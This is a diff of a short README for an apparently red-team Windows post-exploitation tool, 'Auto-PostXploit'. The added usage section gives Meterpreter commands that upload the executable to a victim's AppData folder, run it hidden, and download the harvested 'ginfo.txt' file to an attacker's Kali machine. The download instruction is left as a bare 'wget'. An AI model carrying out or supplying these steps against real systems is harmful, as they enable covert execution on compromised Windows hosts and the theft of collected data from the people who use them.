@@ -1,11 +1,24 @@
 # Auto-PostXploit
-Windows Auto Post Exploitation - For ReD Team
+<b>Windows Auto Post Exploitation - For ReD Team</b>
 
 
 * https://github.com/emilyanncr/Windows-Post-Exploitation/
 
 
+## Download :
+
+  #### wget 
+
+
 ## Usage :
 
-
-  #### meterpreter >
+  
+  #### meterpreter > upload *path*/Auto-PostXploit.exe C:/Users/*USETNAME*/AppData
+  
+  #### meterpreter > execute -H -f C:/Users/*USETNAME*/AppData/Auto-PostXploit.exe
+  
+  [If Auto-PostXploit.exe Not In Process]
+  
+  #### meterpreter > download C:/Users/*USETNAME*/AppData/ginfo.txt /root/Desktop
+  
+  #### root@kali:~# cat /root/Desktop/ginfo.txt
